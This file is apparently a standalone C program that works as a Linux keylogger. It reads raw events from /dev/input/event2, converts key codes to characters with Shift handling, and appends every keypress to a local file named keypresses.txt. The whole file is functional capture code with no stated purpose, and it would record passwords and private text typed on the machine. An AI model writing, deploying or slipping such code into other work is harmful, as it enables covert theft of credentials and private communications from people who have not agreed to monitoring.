#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char keycode_to_char(int code, int shift) {
    if (code == KEY_Q) return shift ? 'Q' : 'q';
    if (code == KEY_W) return shift ? 'W' : 'w';
    if (code == KEY_E) return shift ? 'E' : 'e';
    if (code == KEY_R) return shift ? 'R' : 'r';
    if (code == KEY_T) return shift ? 'T' : 't';
    if (code == KEY_Y) return shift ? 'Y' : 'y';
    if (code == KEY_U) return shift ? 'U' : 'u';
    if (code == KEY_I) return shift ? 'I' : 'i';
    if (code == KEY_O) return shift ? 'O' : 'o';
    if (code == KEY_P) return shift ? 'P' : 'p';

    if (code == KEY_A) return shift ? 'A' : 'a';
    if (code == KEY_S) return shift ? 'S' : 's';
    if (code == KEY_D) return shift ? 'D' : 'd';
    if (code == KEY_F) return shift ? 'F' : 'f';
    if (code == KEY_G) return shift ? 'G' : 'g';
    if (code == KEY_H) return shift ? 'H' : 'h';
    if (code == KEY_J) return shift ? 'J' : 'j';
    if (code == KEY_K) return shift ? 'K' : 'k';
    if (code == KEY_L) return shift ? 'L' : 'l';

    if (code == KEY_Z) return shift ? 'Z' : 'z';
    if (code == KEY_X) return shift ? 'X' : 'x';
    if (code == KEY_C) return shift ? 'C' : 'c';
    if (code == KEY_V) return shift ? 'V' : 'v';
    if (code == KEY_B) return shift ? 'B' : 'b';
    if (code == KEY_N) return shift ? 'N' : 'n';
    if (code == KEY_M) return shift ? 'M' : 'm';

    if (code == KEY_SPACE) return ' ';
    if (code == KEY_ENTER) return '\n';
    if (code == KEY_TAB) return '\t';
    if (code == KEY_COMMA) return ',';
    if (code == KEY_DOT) return '.';
    if (code == KEY_SLASH) return '/';
    if (code == KEY_SEMICOLON) return ';';
    if (code == KEY_APOSTROPHE) return '\'';
    if (code == KEY_LEFTBRACE) return '[';
    if (code == KEY_RIGHTBRACE) return ']';
    if (code == KEY_BACKSLASH) return '\\';
    if (code == KEY_MINUS) return '-';
    if (code == KEY_EQUAL) return '=';

    if (code == KEY_1) return shift ? '!' : '1';
    if (code == KEY_2) return shift ? '@' : '2';
    if (code == KEY_3) return shift ? '#' : '3';
    if (code == KEY_4) return shift ? '$' : '4';
    if (code == KEY_5) return shift ? '%' : '5';
    if (code == KEY_6) return shift ? '^' : '6';
    if (code == KEY_7) return shift ? '&' : '7';
    if (code == KEY_8) return shift ? '*' : '8';
    if (code == KEY_9) return shift ? '(' : '9';
    if (code == KEY_0) return shift ? ')' : '0';

    return 0;
}

void handle_backspace(FILE *log) {
    fseek(log, -1, SEEK_END);

    fputc(' ', log);
    fflush(log);

    fseek(log, 0, SEEK_END);
}

int main() {
    int fd = open("/dev/input/event2", O_RDONLY);
    if (fd < 0) {
        perror("open event device");
        return 1;
    }

    FILE *log = fopen("keypresses.txt", "a");
    if (!log) {
        perror("fopen");
        return 1;
    }

    struct input_event ev;
    int shift = 0;

    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n != sizeof(ev)) continue;

        if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
            shift = (ev.value == 1) ? 1 : 0;
        }

        if (ev.type == EV_KEY && ev.value == 1 && ev.code == KEY_BACKSPACE) {
            handle_backspace(log);
            continue;
        }

        if (ev.type == EV_KEY && ev.value == 1) {
            char c = keycode_to_char(ev.code, shift);
            if (c) {
                fputc(c, log);
                fflush(log);
            }
        }
    }

    close(fd);
    fclose(log);
    return 0;
}
